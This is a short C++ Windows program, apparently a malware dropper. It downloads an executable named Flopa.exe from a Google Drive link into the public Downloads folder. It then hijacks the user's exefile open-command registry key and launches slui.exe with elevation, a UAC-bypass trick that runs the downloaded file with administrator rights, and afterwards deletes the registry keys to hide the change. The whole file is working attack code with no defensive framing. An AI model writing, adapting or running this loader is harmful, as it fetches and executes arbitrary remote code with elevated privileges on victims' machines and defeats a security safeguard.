#pragma comment(lib, "urlmon.lib")
#include <Windows.h>
#include <string>
using namespace std;

void CRK(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		HKEY hKeyResult;
		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
		RegCloseKey(hKey);
	}
}
void DRK(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteKeyW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
void SRV(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
	const wchar_t* dwnld_URL = L"https://drive.google.com/uc?export=download&id=1eCpxk6SkIG6MCmOLgPt_nkgjaw698b7Z";
	const wchar_t* savepath = L"C:\\Users\\Public\\Downloads\\Flopa.exe";
	URLDownloadToFile(NULL, dwnld_URL, savepath, 0, NULL);

	CRK(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	CRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");

	SRV(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", L"C:\\Users\\Public\\Downloads\\Flopa.exe");
	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);

	Sleep(1000);

	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	DRK(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	return 0;
}
